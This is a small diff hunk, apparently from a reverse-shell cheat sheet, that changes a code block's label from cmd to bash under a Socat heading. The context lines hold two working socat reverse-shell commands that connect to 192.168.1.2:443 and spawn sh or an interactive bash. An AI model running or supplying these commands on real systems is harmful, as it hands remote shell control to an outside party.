@@ -483,7 +483,7 @@
   ---
   # <kbd>Socat</kbd>
    
-  ```cmd
+  ```bash
   socat TCP:192.168.1.2:443 EXEC:sh
    
   socat TCP:192.168.1.2:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane 
